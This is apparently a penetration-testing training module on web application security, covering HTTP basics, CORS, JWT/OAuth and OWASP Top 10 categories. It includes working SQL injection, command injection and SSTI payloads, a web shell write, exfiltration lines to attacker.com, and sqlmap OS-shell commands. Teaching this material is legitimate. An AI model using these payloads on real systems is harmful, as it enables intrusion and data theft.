---
layout: default
title: "Module 09 — Web Application Security"
nav_order: 10
---

# Module 09 — Web Application Security
{: .fs-9 }

Master the art of finding, exploiting, and remediating web application vulnerabilities -- from the OWASP Top 10 to advanced injection techniques and Burp Suite mastery.
{: .fs-6 .fw-300 }

---

## Table of Contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## 9.1 Web Application Fundamentals

Before attacking web applications, you must understand how they work at every layer. This section provides the deep technical foundation required for effective web security testing.

### 9.1.1 HTTP/HTTPS Protocol Deep Dive

HTTP (Hypertext Transfer Protocol) is the foundation of all web communication. Every request you intercept, modify, or forge in a penetration test is an HTTP message.

#### HTTP Request Structure

```
GET /api/users/42 HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Accept: application/json
Cookie: session=abc123def456
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Connection: keep-alive
```

Every HTTP request contains:

| Component | Description |
|:----------|:------------|
| **Method** | The action to perform (GET, POST, PUT, DELETE, etc.) |
| **Path** | The resource being requested (`/api/users/42`) |
| **Version** | HTTP version (`HTTP/1.1`, `HTTP/2`) |
| **Headers** | Key-value metadata pairs |
| **Body** | Optional data payload (POST, PUT requests) |

#### HTTP Methods

| Method | Purpose | Security Relevance |
|:-------|:--------|:-------------------|
| `GET` | Retrieve data | Parameters in URL -- visible in logs, history, referer headers |
| `POST` | Submit data | Parameters in body -- less visible but not encrypted without TLS |
| `PUT` | Update/replace resource | May allow overwriting files or records |
| `PATCH` | Partial update | Can modify specific fields -- test for mass assignment |
| `DELETE` | Remove resource | Verify authorization before allowing deletion |
| `HEAD` | GET without body | Useful for reconnaissance without downloading content |
| `OPTIONS` | Supported methods | Reveals CORS configuration and allowed methods |
| `TRACE` | Diagnostic echo | Can enable Cross-Site Tracing (XST) attacks |
| `CONNECT` | Establish tunnel | Used for proxying HTTPS traffic |

{: .tip }
> During testing, always check what HTTP methods a server accepts. Use `curl -X OPTIONS http://target.com/ -i` or Burp Intruder with a list of methods. Unexpected methods like PUT or DELETE on an endpoint can lead to serious vulnerabilities.

#### HTTP Response Structure

```
HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: session=xyz789; HttpOnly; Secure; SameSite=Strict
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Length: 128

{"id": 42, "name": "Alice", "role": "admin"}
```

#### Status Codes for Penetration Testers

| Code | Meaning | Security Relevance |
|:-----|:--------|:-------------------|
| `200 OK` | Request succeeded | Normal response -- examine the body |
| `201 Created` | Resource created | Confirm what was created -- test for injection |
| `301/302` | Redirect | Check for open redirects |
| `400 Bad Request` | Malformed request | May reveal input validation logic |
| `401 Unauthorized` | Authentication required | Try default credentials, brute force |
| `403 Forbidden` | Access denied | Try method switching, path traversal, header manipulation |
| `404 Not Found` | Resource missing | Useful for directory enumeration |
| `405 Method Not Allowed` | Wrong HTTP method | Try other methods |
| `500 Internal Server Error` | Server crash | May indicate injection vulnerability or reveal stack traces |
| `502/503` | Server overload/down | May indicate successful DoS or backend misconfiguration |

#### Cookies and Sessions

Cookies are the primary mechanism for maintaining state in HTTP:

```
Set-Cookie: sessionId=abc123;
            Domain=.target.com;
            Path=/;
            Expires=Thu, 01 Jan 2027 00:00:00 GMT;
            HttpOnly;
            Secure;
            SameSite=Strict
```

| Cookie Attribute | Purpose | Attack if Missing |
|:-----------------|:--------|:------------------|
| `HttpOnly` | Prevents JavaScript access | XSS can steal session cookies |
| `Secure` | Only sent over HTTPS | Cookies exposed on HTTP connections |
| `SameSite=Strict` | No cross-site sending | CSRF attacks become possible |
| `SameSite=Lax` | Sent on top-level navigation | Partial CSRF protection |
| `Domain` | Scope of the cookie | Overly broad domain shares cookies with subdomains |
| `Path` | URL path scope | Overly broad path exposes cookies to unrelated endpoints |
| `Expires/Max-Age` | Cookie lifetime | Long-lived sessions increase hijacking window |

{: .warning }
> Always check cookie attributes during a web assessment. Missing `HttpOnly` and `Secure` flags are common findings. Use Burp Suite's response tab or browser developer tools to inspect every `Set-Cookie` header.

#### HTTPS and TLS

HTTPS wraps HTTP inside TLS (Transport Layer Security), providing:

- **Confidentiality** -- Encryption prevents eavesdropping
- **Integrity** -- HMAC prevents tampering
- **Authentication** -- Certificates verify server identity

Common TLS issues to test for:

```bash
# Test SSL/TLS configuration
sslscan target.com

# Check for specific vulnerabilities
testssl.sh target.com

# Nmap SSL scripts
nmap --script ssl-enum-ciphers -p 443 target.com
nmap --script ssl-heartbleed -p 443 target.com
```

| TLS Vulnerability | Description |
|:------------------|:------------|
| SSLv2/SSLv3 enabled | Deprecated protocols with known attacks (POODLE) |
| Weak cipher suites | RC4, DES, export-grade ciphers |
| BEAST | CBC mode vulnerability in TLS 1.0 |
| CRIME/BREACH | Compression-based side-channel attacks |
| Heartbleed | OpenSSL memory disclosure (CVE-2014-0160) |
| Missing HSTS | Allows SSL stripping attacks |

### 9.1.2 Same-Origin Policy and CORS

#### Same-Origin Policy (SOP)

The Same-Origin Policy is the browser's most critical security mechanism. Two URLs have the **same origin** if and only if they share:

| Component | `https://app.target.com:443/path` |
|:----------|:----------------------------------|
| **Scheme** | `https` |
| **Host** | `app.target.com` |
| **Port** | `443` |

Examples:

| URL A | URL B | Same Origin? | Why? |
|:------|:------|:-------------|:-----|
| `https://target.com/a` | `https://target.com/b` | Yes | Same scheme, host, port |
| `https://target.com` | `http://target.com` | No | Different scheme |
| `https://target.com` | `https://api.target.com` | No | Different host |
| `https://target.com` | `https://target.com:8443` | No | Different port |

SOP prevents a malicious page on `evil.com` from reading responses from `bank.com` via JavaScript. Without it, any website could steal your data from any other site you are logged into.

#### Cross-Origin Resource Sharing (CORS)

CORS relaxes SOP by allowing servers to specify which origins may access their resources:

```
Access-Control-Allow-Origin: https://trusted.com
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

**Dangerous CORS misconfigurations:**

```
# Reflects any origin (wildcard with credentials = vulnerability)
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

# Null origin allowed (exploitable via sandboxed iframes)
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# Wildcard (safe only without credentials)
Access-Control-Allow-Origin: *
```

{: .danger }
> A misconfigured CORS policy that reflects arbitrary origins **with credentials** allows any website to read authenticated responses from the target. This is equivalent to a full account takeover in many cases. Always test by sending a request with `Origin: https://evil.com` and checking if it is reflected in `Access-Control-Allow-Origin`.

**Testing CORS:**

```bash
# Test if origin is reflected
curl -H "Origin: https://evil.com" -I https://target.com/api/user

# Check for null origin acceptance
curl -H "Origin: null" -I https://target.com/api/user

# Check with credentials
curl -H "Origin: https://evil.com" -b "session=abc123" \
     -I https://target.com/api/user
```

### 9.1.3 Web Application Architecture

Understanding architecture reveals attack surface:

```
┌────────────┐     ┌──────────────┐     ┌──────────────┐     ┌──────────┐
│  Browser   │────▶│  Web Server  │────▶│  App Server  │────▶│ Database │
│ (Frontend) │◀────│ (Nginx/Apache│◀────│  (Node/PHP/  │◀────│ (MySQL/  │
│            │     │  /Caddy)     │     │   Python)    │     │  Postgres│
└────────────┘     └──────────────┘     └──────────────┘     └──────────┘
     │                    │                    │                    │
     ▼                    ▼                    ▼                    ▼
  XSS, CSRF,        Misconfig,           Injection,          SQLi,
  Clickjacking,     Path Traversal,      Auth Bypass,        Data Leak,
  Open Redirect     Info Disclosure       Logic Flaws         Priv Esc
```

| Layer | Technologies | Common Vulnerabilities |
|:------|:-------------|:----------------------|
| **Frontend** | HTML, CSS, JavaScript, React, Angular, Vue | XSS, DOM manipulation, client-side validation bypass |
| **Web Server** | Nginx, Apache, IIS, Caddy | Misconfiguration, path traversal, default pages |
| **Application** | Node.js, PHP, Python, Java, .NET | Injection, authentication flaws, business logic |
| **Database** | MySQL, PostgreSQL, MongoDB, SQLite | SQL injection, NoSQL injection, data exposure |
| **API** | REST, GraphQL, gRPC, WebSocket | Broken authentication, BOLA, excessive data exposure |
| **CDN/WAF** | Cloudflare, Akamai, AWS WAF | WAF bypass, origin IP discovery, cache poisoning |

### 9.1.4 Authentication Mechanisms

#### Session-Based Authentication

```
1. Client sends credentials (POST /login)
2. Server validates, creates session in server-side store
3. Server returns Set-Cookie: sessionId=abc123
4. Client sends cookie with every subsequent request
5. Server looks up session on each request
```

**Attacks:** Session fixation, session hijacking, session prediction, cookie theft via XSS.

#### Token-Based Authentication (JWT)

```
1. Client sends credentials (POST /login)
2. Server validates, generates JWT
3. Server returns: {"token": "eyJhbGciOiJIUzI1NiIs..."}
4. Client sends: Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
5. Server verifies token signature on each request
```

A JWT has three Base64-encoded parts separated by dots:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.     # Header
eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ. # Payload
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  # Signature
```

**JWT attacks:**

| Attack | Description |
|:-------|:------------|
| `alg: none` | Set algorithm to "none" -- server skips signature verification |
| `alg: HS256` (when RS256 expected) | Trick server into using public key as HMAC secret |
| Weak secret | Brute-force the HMAC secret with `hashcat` or `jwt_tool` |
| Missing expiration | Token never expires -- stolen tokens valid forever |
| Sensitive data in payload | JWT payload is Base64-encoded, not encrypted |
| `kid` injection | Key ID header may be vulnerable to path traversal or SQLi |

```bash
# Decode JWT
echo "eyJhbGci..." | base64 -d

# jwt_tool for comprehensive JWT testing
python3 jwt_tool.py <token> -M at   # All tests
python3 jwt_tool.py <token> -X a    # alg:none attack
python3 jwt_tool.py <token> -X k    # Key confusion attack
python3 jwt_tool.py <token> -C -d wordlist.txt  # Crack secret
```

#### OAuth 2.0

OAuth is a delegation protocol, not an authentication protocol (OpenID Connect adds authentication on top):

```
┌──────┐    1. Redirect to Provider    ┌──────────┐
│ User │──────────────────────────────▶│  OAuth   │
│      │                               │ Provider │
│      │◀──────────────────────────────│ (Google) │
└──┬───┘    2. Auth code callback      └──────────┘
   │                                        ▲
   │ 3. Send auth code                      │ 4. Exchange code for token
   ▼                                        │
┌──────┐────────────────────────────────────┘
│ App  │    5. Access token returned
│Server│    6. Use token to access user data
└──────┘
```

**OAuth vulnerabilities:**

- **Open redirect in callback** -- steal authorization codes
- **Missing `state` parameter** -- enables CSRF against OAuth flow
- **Token leakage via Referer** -- tokens in URL fragments leak to third parties
- **Insecure token storage** -- tokens in localStorage accessible via XSS
- **Scope escalation** -- requesting broader permissions than necessary

### 9.1.5 REST API Security

REST APIs are the backbone of modern applications. Key testing areas:

```bash
# Enumerate API endpoints
ffuf -u https://target.com/api/FUZZ -w /usr/share/wordlists/api-endpoints.txt

# Test authentication
curl -X GET https://target.com/api/users          # Without auth
curl -X GET https://target.com/api/admin/users     # Admin endpoint without auth

# Test BOLA (Broken Object Level Authorization)
curl -H "Authorization: Bearer <user_a_token>" \
     https://target.com/api/users/42               # User A's data
curl -H "Authorization: Bearer <user_a_token>" \
     https://target.com/api/users/43               # User B's data (should fail)

# Test mass assignment
curl -X POST https://target.com/api/users \
     -H "Content-Type: application/json" \
     -d '{"name":"test","email":"test@test.com","role":"admin","isAdmin":true}'

# Test rate limiting
for i in $(seq 1 100); do
    curl -s -o /dev/null -w "%{http_code}\n" \
         -X POST https://target.com/api/login \
         -d '{"user":"admin","pass":"attempt'$i'"}'
done
```

{: .note }
> Modern APIs often use GraphQL instead of REST. GraphQL has its own attack surface: introspection queries that reveal the entire schema, batched queries for brute-force, nested queries for DoS, and injection in query arguments. Always check for `/graphql` and try `{__schema{types{name}}}`.

---

## 9.2 OWASP Top 10 (2021)

The OWASP Top 10 is the standard awareness document for web application security. Each category below includes theory, detection, exploitation techniques, and remediation guidance.

{: .note }
> The OWASP Top 10 is updated periodically. The 2021 edition reorganized several categories and introduced new ones. As a penetration tester, you should know these categories intimately -- they form the basis of most web application security assessments and are heavily tested in certifications.

### 9.2.1 A01: Broken Access Control

Broken Access Control moved from position 5 to position 1 in 2021, reflecting its prevalence. **94% of applications** tested had some form of broken access control.

Access control enforces that users cannot act outside their intended permissions. When it fails, attackers can:

- Access other users' data
- Modify or delete unauthorized records
- Perform administrative functions
- Escalate privileges

#### Insecure Direct Object Reference (IDOR)

IDOR occurs when an application uses user-controllable input to directly access objects (database records, files, etc.) without verifying the user is authorized.

**Example -- Vulnerable endpoint:**

```
GET /api/invoices/1001 HTTP/1.1
Cookie: session=user_alice_session
```

If Alice can change `1001` to `1002` and see Bob's invoice, this is an IDOR.

**Testing methodology:**

```bash
# 1. Log in as User A, capture a request to a resource
GET /api/orders/5001    # User A's order

# 2. Log in as User B, attempt to access User A's resource
GET /api/orders/5001    # Should return 403, not 200

# 3. Test with sequential IDs
for id in $(seq 5000 5050); do
    curl -s -o /dev/null -w "$id: %{http_code}\n" \
         -H "Cookie: session=user_b_session" \
         "https://target.com/api/orders/$id"
done

# 4. Test with different object types
GET /api/users/42/profile
GET /api/users/42/settings
GET /api/users/42/payment-methods
```

{: .tip }
> IDORs are not limited to numeric IDs. Test with UUIDs (try guessing patterns), usernames, email addresses, filenames, and any parameter that references a specific object. Tools like Autorize (Burp extension) automate this by replaying requests with a lower-privileged session.

#### Forced Browsing

Accessing pages or functionality that are not linked in the UI but exist on the server:

```bash
# Directory and file brute-forcing
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt

# Common admin paths
/admin
/admin/dashboard
/administrator
/manage
/panel
/console
/wp-admin
/phpmyadmin

# Backup and configuration files
/backup.sql
/database.sql.gz
/.env
/config.php.bak
/web.config
/.git/HEAD
/.svn/entries
```

#### Privilege Escalation

**Horizontal privilege escalation:** Accessing another user's data at the same privilege level (User A reads User B's data).

**Vertical privilege escalation:** Gaining higher privileges (regular user becomes admin).

```bash
# Test vertical escalation -- access admin functions as regular user
POST /api/admin/create-user HTTP/1.1
Cookie: session=regular_user_session
Content-Type: application/json

{"username":"hacker","password":"password","role":"admin"}

# Test role manipulation
POST /api/users/profile HTTP/1.1
Content-Type: application/json

{"name":"Alice","role":"admin"}    # Can user set their own role?

# Test HTTP method switching
# If GET /admin/users returns 403, try:
POST /admin/users
PUT /admin/users
PATCH /admin/users
```

#### Missing Function-Level Access Control

```bash
# API endpoints may lack authorization checks
GET /api/v1/users         # Regular endpoint (authorized)
GET /api/v1/admin/users   # Admin endpoint (may lack auth check)
DELETE /api/v1/users/42   # Delete endpoint (may not verify ownership)

# Test with different HTTP methods
# The server might check auth for GET but not DELETE
```

**Remediation:**

- Implement server-side access control on every endpoint
- Deny by default -- require explicit grants
- Use role-based access control (RBAC) or attribute-based access control (ABAC)
- Log and alert on access control failures
- Rate-limit API access to minimize automated enumeration
- Use unpredictable resource identifiers (UUIDs over sequential IDs)
- Disable directory listing on the web server

---

### 9.2.2 A02: Cryptographic Failures

Previously called "Sensitive Data Exposure," this category focuses on failures related to cryptography that lead to exposure of sensitive data.

#### Sensitive Data in Transit

```bash
# Check if HTTP redirects to HTTPS
curl -I http://target.com

# Check HSTS header
curl -sI https://target.com | grep -i strict-transport

# Test for mixed content
# Browse the site over HTTPS and check for HTTP resources in browser console

# Check for sensitive data in URLs (visible in logs, referer headers)
# BAD: https://target.com/reset?token=abc123&email=user@target.com
# GOOD: Token sent in POST body or HTTP header
```

#### Sensitive Data at Rest

| Issue | Description | Detection |
|:------|:------------|:----------|
| Passwords in plaintext | Database stores raw passwords | Register, then check via SQLi or database access |
| Weak hashing | MD5 or SHA1 without salt | Extract hashes, identify algorithm |
| Missing encryption | PII, credit cards stored unencrypted | Data breach or SQLi reveals raw data |
| Hardcoded secrets | API keys, passwords in source code | Source code review, `.env` files, git history |

```bash
# Check for sensitive data in page source
curl -s https://target.com | grep -iE "(password|secret|api_key|token|aws)"

# Check for exposed .env files
curl -s https://target.com/.env

# Check git history for secrets
# If .git is exposed:
wget -r https://target.com/.git/
git log --all --oneline
git log --all -p | grep -iE "(password|secret|key)"
```

#### Weak TLS Configuration

```bash
# Comprehensive SSL/TLS scan
sslscan target.com

# Alternative with testssl.sh
testssl.sh --severity HIGH target.com

# Check specific issues
# Weak ciphers, expired certs, self-signed certs,
# missing certificate chain, weak key size
```

**Remediation:**

- Encrypt all sensitive data at rest and in transit
- Use strong, current algorithms (AES-256-GCM, Argon2id for passwords)
- Enforce HTTPS everywhere with HSTS
- Do not store sensitive data unnecessarily
- Disable caching for responses containing sensitive data
- Use TLS 1.2+ with strong cipher suites only

---

### 9.2.3 A03: Injection

Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data tricks the interpreter into executing unintended commands or accessing unauthorized data.

#### SQL Injection -- Deep Dive

SQL injection (SQLi) is one of the most critical and well-known web vulnerabilities. It occurs when user input is concatenated directly into SQL queries.

**Why `' OR 1=1--` works:**

```sql
-- Application code (PHP example):
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] .
         "' AND password = '" . $_POST['password'] . "'";

-- Normal input: username=alice, password=secret
SELECT * FROM users WHERE username = 'alice' AND password = 'secret'

-- Malicious input: username=' OR 1=1--, password=anything
SELECT * FROM users WHERE username = '' OR 1=1--' AND password = 'anything'

-- The ' closes the string
-- OR 1=1 makes the WHERE clause always true
-- -- comments out the rest of the query
-- Result: returns ALL users (authentication bypassed)
```

{: .danger }
> SQL injection can lead to complete database compromise, data theft, data modification, data deletion, command execution on the database server, and in some cases, full server compromise. Always test responsibly and only on systems you have explicit authorization to test.

##### Finding Injection Points

Test every input that reaches the database:

```
# URL parameters
https://target.com/products?id=1
https://target.com/products?category=electronics
https://target.com/search?q=test

# POST data
username=admin&password=test

# HTTP headers (less common but possible)
Cookie: session=value
User-Agent: Mozilla/5.0
X-Forwarded-For: 127.0.0.1
Referer: https://previous-page.com

# JSON/XML bodies
{"id": 1, "search": "test"}
```

**Initial probing payloads:**

```
'                    # Single quote -- look for SQL error
"                    # Double quote
' OR '1'='1          # Always-true condition
' OR '1'='2          # Always-false condition (compare behavior)
' AND '1'='1         # True condition with AND
' AND '1'='2         # False condition with AND
1 OR 1=1             # Numeric injection (no quotes needed)
1 AND 1=2            # Numeric false condition
'; SELECT 1--        # Statement termination
' UNION SELECT NULL--# UNION test
```

{: .tip }
> Compare the response when injecting a true condition (`' OR '1'='1`) vs. a false condition (`' OR '1'='2`). If the responses differ, you likely have a SQL injection even if no error is displayed. This is the basis of Boolean-based blind SQLi.

##### Types of SQL Injection

**1. Union-Based SQLi**

The most efficient type -- allows you to extract data directly in the response.

```sql
-- Step 1: Determine number of columns (increment NULL count until no error)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--

-- Step 2: Find columns that display data (look for visible output)
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--

-- Step 3: Extract database version
' UNION SELECT NULL,version(),NULL,NULL--           -- MySQL/PostgreSQL
' UNION SELECT NULL,@@version,NULL,NULL--           -- MySQL/MSSQL

-- Step 4: List all databases
' UNION SELECT NULL,schema_name,NULL,NULL
  FROM information_schema.schemata--                -- MySQL/PostgreSQL

-- Step 5: List tables in a specific database
' UNION SELECT NULL,table_name,NULL,NULL
  FROM information_schema.tables
  WHERE table_schema='target_db'--

-- Step 6: List columns in a table
' UNION SELECT NULL,column_name,NULL,NULL
  FROM information_schema.columns
  WHERE table_name='users'--

-- Step 7: Extract data
' UNION SELECT NULL,username,password,NULL
  FROM users--

-- Concatenate multiple columns into one
' UNION SELECT NULL,CONCAT(username,':',password),NULL,NULL
  FROM users--
```

**2. Error-Based SQLi**

Extracts data through database error messages:

```sql
-- MySQL: extractvalue / updatexml
' AND extractvalue(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
' AND updatexml(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)--

-- PostgreSQL: CAST errors
' AND 1=CAST((SELECT version()) AS int)--

-- MSSQL: CONVERT errors
' AND 1=CONVERT(int, (SELECT @@version))--
```

**3. Boolean-Based Blind SQLi**

No visible output or errors -- infer data from response differences:

```sql
-- Test if injectable
' AND 1=1--    # True: normal response
' AND 1=2--    # False: different response (missing content, different length)

-- Extract data character by character
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--
-- ... iterate through characters

-- More efficient: binary search with ASCII values
' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1) > 77--
' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1) > 102--
-- Narrow down each character in ~7 requests (log2(128))
```

**4. Time-Based Blind SQLi**

No response difference at all -- infer data from response time:

```sql
-- MySQL
' AND IF(1=1, SLEEP(5), 0)--                          # 5-second delay = true
' AND IF(1=2, SLEEP(5), 0)--                          # No delay = false

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- Extract data
' AND IF((SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a',
         SLEEP(5), 0)--
```

**5. Out-of-Band SQLi**

Exfiltrate data via DNS or HTTP requests when no other channel works:

```sql
-- MySQL (requires FILE privilege and outbound connections)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',
  (SELECT password FROM users LIMIT 1),
  '.attacker-server.com\\share'))--

-- MSSQL (xp_dirtree for DNS exfil)
'; EXEC master..xp_dirtree '\\' +
  (SELECT TOP 1 password FROM users) +
  '.attacker-server.com\share'--

-- PostgreSQL (COPY to program)
'; COPY (SELECT password FROM users)
  TO PROGRAM 'curl http://attacker.com/?data=' ||
  (SELECT password FROM users LIMIT 1)--
```

##### Advanced SQLi: Reading Files and Writing Shells

```sql
-- MySQL: Read files (requires FILE privilege)
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL,NULL--
' UNION SELECT NULL,LOAD_FILE('/var/www/html/config.php'),NULL,NULL--

-- MySQL: Write web shell (requires FILE privilege + writable web directory)
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL,NULL
  INTO OUTFILE '/var/www/html/shell.php'--

-- MSSQL: Enable and use xp_cmdshell
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami';--

-- PostgreSQL: Command execution via COPY
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/output.txt';--
```

{: .warning }
> Writing files or executing commands through SQLi is extremely noisy and may cause damage. In a real engagement, discuss with your client before attempting these techniques. Always prefer the least invasive method that proves the vulnerability.

##### SQLMap Automation

SQLMap is the gold standard for automated SQL injection detection and exploitation.

```bash
# Basic detection
sqlmap -u "http://target.com/page?id=1" --batch

# Specify database management system
sqlmap -u "http://target.com/page?id=1" --dbms=mysql --batch

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "http://target.com/page?id=1" -D target_db --tables

# Enumerate columns in a table
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --columns

# Dump table contents
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D target_db -T users \
       -C username,password --dump

# Get an OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# Get a SQL shell
sqlmap -u "http://target.com/page?id=1" --sql-shell

# Read a file from the server
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"

# Write a file to the server
sqlmap -u "http://target.com/page?id=1" \
       --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

**SQLMap with POST requests:**

```bash
# POST data
sqlmap -u "http://target.com/login" \
       --data="username=admin&password=test" -p username

# From a Burp request file
sqlmap -r request.txt --batch

# With cookies
sqlmap -u "http://target.com/page?id=1" \
       --cookie="session=abc123; role=user"

# With custom headers
sqlmap -u "http://target.com/page?id=1" \
       --headers="Authorization: Bearer eyJ...\nX-Custom: value"

# JSON body
sqlmap -u "http://target.com/api/search" \
       --data='{"query":"test"}' --content-type="application/json"
```

**SQLMap WAF bypass with tamper scripts:**

```bash
# Space to comment bypass
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment

# Multiple tamper scripts
sqlmap -u "http://target.com/page?id=1" \
       --tamper=space2comment,between,randomcase

# Common tamper scripts:
# space2comment     - Replaces spaces with /**/
# between           - Replaces > with NOT BETWEEN 0 AND
# randomcase        - Random upper/lower case
# charencode        - URL-encodes characters
# equaltolike       - Replaces = with LIKE
# greatest          - Replaces > with GREATEST
# space2hash        - Replaces spaces with # and newline (MySQL)
# space2morehash    - Variation of space2hash
# base64encode      - Base64 encodes the payload
# apostrophemask    - Replaces ' with UTF-8 full-width equivalent

# High level of testing (slower but more thorough)
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3

# Use random user-agent
sqlmap -u "http://target.com/page?id=1" --random-agent

# Use Tor for anonymity
sqlmap -u "http://target.com/page?id=1" --tor --tor-type=SOCKS5
```

{: .tip }
> Always try manual SQLi testing first before running SQLMap. Manual testing helps you understand the vulnerability, reduces noise, and avoids triggering WAFs. Use SQLMap when you need to efficiently extract large amounts of data after confirming the injection point manually.

#### Command Injection

OS command injection occurs when user input is passed directly to system commands:

```bash
# Vulnerable PHP code:
# $output = shell_exec("ping -c 4 " . $_GET['ip']);

# Basic injection
; whoami
; cat /etc/passwd
| whoami
|| whoami
& whoami
&& whoami
$(whoami)
`whoami`

# Blind command injection (no output displayed)
; sleep 10                          # Time-based detection
; ping -c 10 attacker.com          # Out-of-band detection
; curl http://attacker.com/$(whoami) # Data exfiltration via HTTP
; nslookup $(whoami).attacker.com  # Data exfiltration via DNS

# Common bypass techniques
# Spaces blocked:
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
X=$'cat\x20/etc/passwd'&&$X

# Keywords blocked:
c'a't /etc/passwd
c"a"t /etc/passwd
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd

# Slashes blocked:
$(echo L2V0Yy9wYXNzd2Q= | base64 -d)  # base64 encoded /etc/passwd
```

{: .warning }
> Command injection is extremely dangerous because it provides direct access to the operating system. Even a blind command injection (where you cannot see output) can be leveraged for full system compromise through out-of-band techniques or reverse shells.

#### LDAP Injection

```
# Vulnerable LDAP query:
# (&(username=INPUT)(password=INPUT))

# Authentication bypass
username: *)(|(&
password: anything

# Enumeration
username: admin*
username: a*
username: admin)(|(password=*
```

#### XPath Injection

```xml
<!-- Vulnerable query: //users/user[username='INPUT' and password='INPUT'] -->

<!-- Bypass authentication -->
' or '1'='1
' or '1'='1' or '1'='1

<!-- Extract data -->
' or name()='username' or '1'='1
```

#### Server-Side Template Injection (SSTI)

SSTI occurs when user input is embedded into server-side templates:

```
# Detection payloads (try each, look for evaluation)
{{7*7}}          # Expect: 49
${7*7}           # Expect: 49
<%= 7*7 %>       # Expect: 49
#{7*7}           # Expect: 49
*{7*7}           # Expect: 49

# Jinja2 (Python/Flask) -- Remote Code Execution
{{config}}
{{config.items()}}
{{''.__class__.__mro__[2].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

# Use tplmap for automated SSTI exploitation
tplmap -u "http://target.com/page?name=test"
```

**Remediation for all injection types:**

- **Never concatenate user input into queries or commands**
- Use parameterized queries / prepared statements for SQL
- Use allowlists for command arguments
- Sanitize and validate all input
- Apply least-privilege principles to database and OS accounts
- Use WAFs as defense-in-depth (not as primary protection)

---

### 9.2.4 A04: Insecure Design

Insecure design is a broad category covering flaws in the application's architecture and business logic that cannot be fixed by perfect implementation alone.

#### Business Logic Flaws

These are vulnerabilities in the application's workflow, not in its code:

| Flaw | Example |
|:-----|:--------|
| **Price manipulation** | Changing the price in a hidden form field or API request |
| **Quantity abuse** | Ordering -1 items to get a credit |
| **Race conditions** | Submitting a coupon code twice simultaneously |
| **Workflow bypass** | Skipping steps in a multi-step process (e.g., payment) |
| **Feature abuse** | Using password reset to enumerate valid email addresses |

```bash
# Price manipulation
POST /api/checkout
{"item_id": 42, "quantity": 1, "price": 0.01}   # Modified from $99.99

# Race condition (send simultaneously)
# Terminal 1:
curl -X POST https://target.com/api/redeem -d '{"code":"DISCOUNT50"}'
# Terminal 2 (simultaneously):
curl -X POST https://target.com/api/redeem -d '{"code":"DISCOUNT50"}'

# Workflow bypass
# Instead of: Step 1 -> Step 2 -> Step 3 -> Confirm
# Try: Step 1 -> Confirm (skip steps 2-3)
```

#### Threat Modeling

For secure design, use threat modeling frameworks:

- **STRIDE** -- Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege
- **DREAD** -- Damage, Reproducibility, Exploitability, Affected Users, Discoverability
- **Attack Trees** -- Map out all possible attack paths
- **PASTA** -- Process for Attack Simulation and Threat Analysis

**Remediation:**

- Integrate threat modeling into the development lifecycle
- Establish and use a library of secure design patterns
- Write abuse cases alongside use cases
- Implement rate limiting and anti-automation controls
- Use circuit breakers for resource-intensive operations

---

### 9.2.5 A05: Security Misconfiguration

The most commonly seen issue. Security misconfiguration can happen at any level of the stack.

```bash
# Check for default credentials
# Common defaults: admin/admin, admin/password, root/toor, test/test

# Check for directory listing
curl https://target.com/images/
curl https://target.com/uploads/
